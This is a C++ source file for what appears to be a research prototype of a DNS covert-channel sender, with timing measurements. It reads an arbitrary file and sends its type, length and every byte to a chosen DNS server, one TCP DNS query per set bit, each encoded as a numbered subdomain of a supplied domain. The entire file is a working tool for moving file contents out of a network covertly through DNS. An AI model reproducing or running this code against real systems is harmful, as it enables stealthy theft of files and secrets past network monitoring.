#include <iostream>
#include <fstream>
#include <bitset>
#include <string>
#include <unistd.h>
#include <cstring>
#include <unordered_map>
#include <cstdint>
#include <chrono>
#include <thread>
#include <vector>
#include <atomic>
#include <iomanip>

#include "extension_map.h"
#include "dns_tcp_client.h"
using namespace std;

// Global accumulators for timing (microseconds)
atomic<long long> g_dns_time_us{0};

void transmit(vector<string> domains, string dns_server){
    DnsTcpClient client;
    if (!client.connect_to(dns_server, "53")) {
        cerr << "connect failed\n";
        return;
    }
    vector<uint8_t> resp;
    for (const auto& qd : domains) {
    #ifdef DEBUG
        cout << "--- sending: " << qd << "\n";
    #endif
        
        // DNS transmission timer: only the query_raw call
        auto t_dns_start = chrono::high_resolution_clock::now();
        if (!client.query_raw(qd, resp)) {
            cerr << "query_raw failed: " << qd << "\n";
            break;
        }
        auto t_dns_end = chrono::high_resolution_clock::now();
        g_dns_time_us += chrono::duration_cast<chrono::microseconds>(t_dns_end - t_dns_start).count();
    }
    client.close();
}

bool send_message(string filename, string nxdomain, string dns_server, int num_threads){
    // Encapsulation tiemr start
    auto t_encap_start = chrono::high_resolution_clock::now();
    
    //  Read input file 
    ifstream input_file(filename, ios::binary);
    if (!input_file.is_open()) {
        cerr << "Unable to open " << filename << endl;
        return false;
    }

    // Get file size
    input_file.seekg(0, input_file.end);
    size_t size = input_file.tellg();
    input_file.seekg(0, input_file.beg);

    // Initialize type(8-bit) and length(24-bit)
    uint8_t type[1] = {0};
    uint8_t length[3] = {0};

    // Get type, using extension_map.h function "getTypeValue"
    type[0] = getTypeValue(filename);

    // Get length (file size)
    length[0] = (size >> 16) & 0xFF;
    length[1] = (size >> 8)  & 0xFF;
    length[2] = size & 0xFF;

#ifdef DEBUG   // Show type and length after setting
    cout << "After Type: " << bitset<8>(type[0]) << endl;
    cout << "File size is: " << size << " bytes\n";
    cout << "File size is (hex): " << hex <<  size << dec << " bytes\n";
    cout << "After Length: " << bitset<8>(length[0]) << " " 
                             << bitset<8>(length[1]) << " " 
                             << bitset<8>(length[2]) << endl;
#endif

    // Initialize value and read from input file
    char* value = new char[size];
    input_file.read(value, size); 
    input_file.close();

    // Encapsulation timer end 
    auto t_encap_end = chrono::high_resolution_clock::now();
    auto encap_time = chrono::duration_cast<chrono::milliseconds>(t_encap_end - t_encap_start).count();

    // Transformation timer start
    auto t_trans_wall_start = chrono::high_resolution_clock::now();

    // Definition thread
    vector<thread> workers;
    workers.reserve(num_threads);

    // Step1: Send type (8-bit) 
    bitset<8> b_type(type[0]);
    vector<string> type_domains;
    for (size_t i = 0; i < b_type.size(); i++) {
        if (b_type[i] == 1) {
            type_domains.push_back(to_string(i) + "." + nxdomain);         
        }
    }

#ifdef DEBUG
    cout << "b_type: " << b_type << "\n";
#endif

    if (!type_domains.empty())
        workers.emplace_back(transmit, type_domains, dns_server);
        
    for (auto& t: workers) t.join();
    workers.clear();

    // Step2: Send length (24-bit) 
    for (size_t i = 0; i < 3; i++) {
        bitset<8> b_length(length[i]);
        vector<string> domains;

        for (size_t j = 0; j < b_length.size(); j++) {
            if (b_length[j] == 1) {
                int index = 8 + i*8 + j;
                domains.push_back(to_string(index) + "." + nxdomain);
            }
        }

    #ifdef DEBUG
        cout << "length[" << i << "]: " << length[i]
            << "\tb_length: " << b_length << "\n";
    #endif

        if (!domains.empty())
            workers.emplace_back(transmit, domains, dns_server);
    }

    for(auto& t: workers) t.join();
    workers.clear();

    // Step3: Send value
    for (size_t i = 0; i < size; i++) {
        bitset<8> bits(value[i]);
        vector<string> domains;

        for (size_t j = 0; j < bits.size(); j++) {
            if (bits[j] == 1) {
                int index = 32 + i*8 + j;
                domains.push_back(to_string(index) + "." + nxdomain);
            }
        }

    #ifdef DEBUG
        cout << "value[" << i << "]: " << value[i]
            << "\tb_value: " << bits << "\n";
    #endif

        if(!domains.empty()) {
            workers.emplace_back(transmit, domains, dns_server);
            
            if ((int)workers.size() == num_threads) {
                for (auto& t: workers) t.join();
                workers.clear();
            }
        }
    }
       
    for (auto& t: workers) t.join();
    workers.clear();

    // Tranformation timer end
    auto t_trans_wall_end = chrono::high_resolution_clock::now();
    auto trans_wall_time = chrono::duration_cast<chrono::milliseconds>(t_trans_wall_end - t_trans_wall_start).count();

    // Print phase timimgs
    cout << fixed << setprecision(2);
    cout << "\n[Timing Breakdown]\n";
    cout << "  Encapsulation time   : " << encap_time << " ms\n";
    cout << "  Transformation time  : " << trans_wall_time << " ms  (wall-clock)\n";
    cout << "    └─ DNS query time  : " << g_dns_time_us.load() / 1000.0 << " ms  (acculated across threads)\n";

    // free memory
    delete[] value;
    return true;
}


int main(int argc, char** argv){
    // Check command line arguments
    if (argc != 5) {
        cerr << "Usage: " << argv[0] << " <filename> <nxdomain> <dns_server> <num_threads>" << endl;
        return 1;
    }

    int num_threads = atoi(argv[4]);

    // ------ start measure ------
    auto start = chrono::high_resolution_clock::now();
    if (!send_message(argv[1], argv[2], argv[3], num_threads)) {
        cerr << "send message() failed.\n";
        return 1;
    }

    // ------- end measure ------
    auto end = chrono::high_resolution_clock::now();

    // ------- total time -------
    auto total_time = chrono::duration_cast<chrono::milliseconds>(end - start).count();
    cout << "  Sender total time    : " << total_time << " ms\n";

    return 0;
}
